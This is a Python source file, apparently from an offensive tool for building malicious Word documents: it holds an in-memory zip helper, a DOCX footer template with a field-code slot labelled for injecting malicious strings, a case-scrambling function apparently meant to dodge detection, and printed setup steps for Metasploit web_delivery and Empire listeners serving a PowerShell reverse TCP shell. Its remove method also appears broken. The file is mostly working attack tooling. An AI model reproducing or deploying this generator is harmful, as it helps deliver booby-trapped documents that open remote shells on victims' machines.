import sys
import os
import zipfile
import io
import logging

__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))

class InMemoryZip(object):
	def __init__(self):
		# Create the in-memory file-like object
		self.in_memory_zip = io.BytesIO()

	# Appends a file with name filename_in_zip and contents of file_contents to the in-memory zip.
	def append(self, filename_in_zip, file_contents):
		# Get a handle to the in-memory zip in append mode
		zf = zipfile.ZipFile(self.in_memory_zip, "a", zipfile.ZIP_DEFLATED, False)

		# Write the file to the in-memory zip
		zf.writestr(filename_in_zip, file_contents)

		# Mark the files as having been created on Windows so that
		# Unix permissions are not inferred as 0000
		for zfile in zf.filelist:
			zfile.create_system = 0

		return self

	def remove(self, filename_in_zip):
		new_imz = InMemoryZip()
		zf_in = zipfile.ZipFile(self.in_memory_zip, 'r')
		zf_out = zipfile.ZipFile(new_imz, 'w')
		for file in zf_in.infolist():
			filename = zf_in.read(file.filename)
			if filename != filename_in_zip:
				zf_out.writestr(file, filename)
		zf_in.close()
		zf_out.close()
		self.in_memory_zip = new_imz

	# Returns a string with the contents of the in-memory zip.
	def read(self):
		self.in_memory_zip.seek(0)
		return self.in_memory_zip.read()

	# Writes the in-memory zip to a file
	def writetofile(self, filename):
		with open(filename, "wb") as f:
			f.write(self.read())


def printerr(*args, **kwargs):
	print(*args, file=sys.stderr, **kwargs)

def debug(*args, **kwargs):
	print("[DEBUG] ", *args, file=sys.stdout, **kwargs)

# Template footer for injecting malicious strings into
footer_file = '''
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:ftr xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex"
xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex"
xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex"
xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex"
xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex"
xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex"
xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex"
xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex"
xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex"
xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink"
xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math"
xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing"
xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
xmlns:w10="urn:schemas-microsoft-com:office:word"
xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml"
xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml"
xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex"
xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup"
xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk"
xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"
xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se wp14">
<w:p w:rsidR="00DD546C" w:rsidRDefault="00DD546C">
 <w:fldSimple w:instr=" zzzmalstring "><w:fldSimple><w:pPr><w:pStyle w:val="Footer"/></w:pPr></w:p></w:ftr>
'''


def instructions(lhost, lport, type):
	metasploit = (
		"To keep your payload as small as possible, build your metasploit listener like so...\n",
		"=" * 30,
		"\nuse exploit/multi/script/web_delivery\n",
		"set LHOST {}\n".format(lhost),
		"set LPORT {}\n".format(lport),
		"set target 2\n",
		"set payload windows/powershell_reverse_tcp\n",
		"set URIPATH /z\n"
		"run -j\n",
		"=" * 30
	)

	empire = (
		"To keep your payload as small as possible, build your empire listener like so...\n",
		"=" * 30,
		"\nuselistener http\n",
		"set Host {}\n".format(lhost),
		"set lport {}\n".format(lport),
		"set StagerURI /download/z\n",
		"execute\n"
	)

	if type == "metasploit":
		return metasploit
	else:
		return empire


def scrambler(c):
	from random import random
	if random() > 0.5:
		return c.upper()
	else:
		return c.lower()

